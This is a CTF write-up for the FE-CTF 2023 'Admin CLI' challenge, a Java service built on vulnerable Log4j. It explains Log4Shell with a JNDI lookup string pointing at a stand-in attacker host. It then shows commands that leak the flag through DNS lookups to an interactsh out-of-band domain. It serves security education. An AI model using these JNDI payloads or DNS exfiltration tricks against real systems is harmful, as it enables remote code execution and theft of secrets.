---
title: 'FECTF 2023 Qualifiers Admin CLI writeup'
shortTitle: 'Admin CLI'
date: 2023-10-30
length: 6 min
author: Alexander
headline: Read a solution to Admin CLI in FE CTF 2023
---

> **Admin CLI**  
> A (very) early version of the administration tool used for FE-CTF was found. Looks like they only just started making it, but maybe it's already vulnerable?
>
> ```
> nc admin-cli.hack.fe-ctf.dk 1337
> ```
>
> [link to code]

---

<details>
<summary>Table of contents</summary>

- [The files](#the-files)
- [A red herring](#a-red-herring)
  - [How does Log4Shell work?](#how-does-log4shell-work)
- [The actual solution](#the-actual-solution)
- [Exploiting the server](#exploiting-the-server)

</details>

## The files

In the download we get the following 2 files.

<details>
<summary>Dockerfile</summary>

```Dockerfile
FROM ubuntu:22.04

RUN apt update -y
RUN apt install -y wget openjdk-19-jdk unzip socat

USER nobody

WORKDIR /tmp
RUN wget http://archive.apache.org/dist/logging/log4j/2.14.1/apache-log4j-2.14.1-bin.zip
RUN unzip apache-log4j-2.14.1-bin.zip

COPY Main.java .
RUN javac -cp '/tmp/apache-log4j-2.14.1-bin/log4j-api-2.14.1.jar:/tmp/apache-log4j-2.14.1-bin/log4j-core-2.14.1.jar' Main.java
CMD socat -v tcp-listen:1337,fork,reuseaddr system:"java -cp '.:/tmp/apache-log4j-2.14.1-bin/log4j-api-2.14.1.jar:/tmp/apache-log4j-2.14.1-bin/log4j-core-2.14.1.jar' Main",stderr
```

</details>
<details>
<summary>Main.java</summary>

```java
import java.util.Base64;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Scanner;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.config.Configurator;


public class Main {

	/* flag{....} */
	private static String API_KEY = Base64.getUrlEncoder().encodeToString(System.getenv("FLAG").getBytes());

	/* Doesn't seem to be authorized, I don't know why... */
	/* https://backend.fe-ctf.local/removePoints?teamId=0&amount=1000&key=api_key */
	private static int HASH_CODE = -615519892;

	/* Should be safe, right? */
	private static Logger logger = LogManager.getLogger(Main.class);

	public static void main(String[] args) {
		Configurator.setLevel(Main.class.getName(), Level.INFO);
		Scanner s = new Scanner(System.in);
		System.out.print("Enter URL: ");
		String input = s.nextLine();
		s.close();
		try {
			URL url = new URL(input.replaceAll("API_KEY", API_KEY));
			if (url.hashCode() == HASH_CODE && url.getHost().equals("backend.fe-ctf.local")) {
				logger.info("URLs Matched, sending request to {}", url);
				/* TODO: Figure out how to send request
				HttpURLConnection con = (HttpURLConnection) url.openConnection();
				con.setRequestMethod("GET")
				*/
			} else {
				logger.warn("URLs are not equal!");
			}
		} catch (MalformedURLException e) {
			logger.error("Invalid URL");
			System.exit(1);
		}
	}
}
```

</details>

This is a docker container that runs some server. When you netcat it, it asks for a URL. If `API_KEY` is present in the URL, it is replaced with a base64 encoding of the flag. Finally, if the url hash matches some hardcoded hash and domain, it is printed.

## A red herring

If you were on the internet in December of 2021, chances are you've heard of [Log4Shell](https://en.wikipedia.org/wiki/Log4j#Log4Shell_vulnerability), the Log4j RCE that affected every java-using company and their dog. The Dockerfile downloads Log4j version 2.14.1, and wouldn't you know, that's the vulnerable one.

### How does Log4Shell work?

Log4j is a logger that support various special syntaxes in the string. For example, `${java:version}` in a logged string would turn into the version of java used. One of these syntaxes allowed you to request resources from the internet: `${jndi:ldap://attacker.com/payload}`. If `payload` is a Java _class file_, the server will execute it.  
_Take a look at the [HackTricks page](https://book.hacktricks.xyz/pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell#log4shell-vulnerability) for more information._

Now to the logging part. The code only logs user input once it passes the hashcode check, which means that we not only have to create a url that matches the hardcoded hash, we also have to include a Log4Shell exploit. Hash collisions are possible, but very hard to pull off in practice, but let's look at the `java.net.URL` `hashCode` method anyway.

```java
protected int hashCode(URL u) {
    int h = 0;

    // Generate the protocol part.
    String protocol = u.getProtocol();
    if (protocol != null)
        h += protocol.hashCode();

    // Generate the host part.
    InetAddress addr = getHostAddress(u);
    [   ...   ]
```

Wait what? So to calculate the hashcode for a URL, Java _gets the IP_ of the host. Turns out that, for [legacy reasons](https://stackoverflow.com/a/2349535/9877700), the way Java determines if 2 URLs are the same is not by looking at the URL itself, but at the _resource_ the url points to. Since multiple domains can point to the same IP, Java decides to look up the IP.  
_HackTricks also has a [page](https://book.hacktricks.xyz/pentesting-web/deserialization/java-dns-deserialization-and-gadgetprobe) for this._

## The actual solution

To get the IP of a domain, Java needs to do a DNS request to said domain. We can listen for this using a tool like [CanaryTokens](https://canarytokens.org/). Simply generate a DNS token and pass it to the program:

```bash
┌──(color㉿COLORDESKTOP)-[~]
└─$ nc admin-cli.hack.fe-ctf.dk 1337
Enter URL: https://h3ft0p3s5pp6gk21b800tvl1f.canarytokens.com
10:05:12.820 [main] WARN  Main - URLs are not equal!
```

and a few seconds later...
![canarytoken email](/media/writeups/fectf23/admin-cli/canarytoken_email.png)

Perfect! This means we should be able to skip the Log4Shell exploit entirely and leak the flag in the DNS request! If we were to pass `https://API_KEY.token.canarytokens.com`, the server should replace `API_KEY` with the flag.  
Sadly, this doesn't work. CanaryTokens doesn't support wildcard subdomains, so the token isn't triggered.

Turns out there's a similar tool that _does_ in fact work with wildcard subdomains: [interactsh](https://github.com/projectdiscovery/interactsh). All we have to do is run the command...

```bash
┌──(color㉿COLORDESKTOP)-[~/go/bin]
└─$ ./interactsh-client
    _       __                       __       __
   (_)___  / /____  _________ ______/ /______/ /_
  / / __ \/ __/ _ \/ ___/ __ '/ ___/ __/ ___/ __ \
 / / / / / /_/  __/ /  / /_/ / /__/ /_(__  ) / / /
/_/_/ /_/\__/\___/_/   \__,_/\___/\__/____/_/ /_/

                projectdiscovery.io

[INF] Current interactsh version 1.1.7 (latest)
[INF] Listing 1 payload for OOB Testing
[INF] ckvo44rjtart315p97ngu7yq3azk3x51j.oast.live
```

...and we get a payload url. If we open it in a browser...

```bash
[ckvo44rjtart315p97ngu7yq3azk3x51j] Received DNS interaction (A) from 188.126.94.66 at 2023-10-30 10:15:25
[ckvo44rjtart315p97ngu7yq3azk3x51j] Received DNS interaction (A) from 188.126.94.66 at 2023-10-30 10:15:25
[ckvo44rjtart315p97ngu7yq3azk3x51j] Received DNS interaction (A) from 188.126.94.66 at 2023-10-30 10:15:25
[ckvo44rjtart315p97ngu7yq3azk3x51j] Received HTTP interaction from 188.126.94.88 at 2023-10-30 10:15:25
[ckvo44rjtart315p97ngu7yq3azk3x51j] Received HTTP interaction from 188.126.94.88 at 2023-10-30 10:15:26
```

...it gets logged. If we were to append a subdomain such as `flag.ckvo44rjtart315p97ngu7yq3azk3x51j.oast.live`...

```bash
[flag.ckvo44rjtart315p97ngu7yq3azk3x51j] Received DNS interaction (A) from 188.126.94.66 at 2023-10-30 10:16:17
[flag.ckvo44rjtart315p97ngu7yq3azk3x51j] Received DNS interaction (A) from 188.126.94.66 at 2023-10-30 10:16:17
[flag.ckvo44rjtart315p97ngu7yq3azk3x51j] Received HTTP interaction from 188.126.94.88 at 2023-10-30 10:16:18
[flag.ckvo44rjtart315p97ngu7yq3azk3x51j] Received HTTP interaction from 188.126.94.88 at 2023-10-30 10:16:18
```

...it gets logged too!

## Exploiting the server

Now all we have to do is send the payload to the server

```bash
┌──(color㉿COLORDESKTOP)-[~]
└─$ nc admin-cli.hack.fe-ctf.dk 1337
Enter URL: http://API_KEY.ckvo44rjtart315p97ngu7yq3azk3x51j.oast.live
10:17:31.110 [main] WARN  Main - URLs are not equal!
```

and we should get the base64 flag.

```bash
[ZmxhZ3tVTjNYUDNDVDNEXzNYRjFMVFI0VDEwTn0=.ckvo44rjtart315p97ngu7yq3azk3x51j] Received DNS interaction (A) from 172.253.248.37 at 2023-10-30 10:17:30
```

Decoding that...

```bash
┌──(color㉿COLORDESKTOP)-[~/go/bin]
└─$ echo "ZmxhZ3tVTjNYUDNDVDNEXzNYRjFMVFI0VDEwTn0=" | base64 -d
flag{UN3XP3CT3D_3XF1LTR4T10N}
```

...we've got a flag!
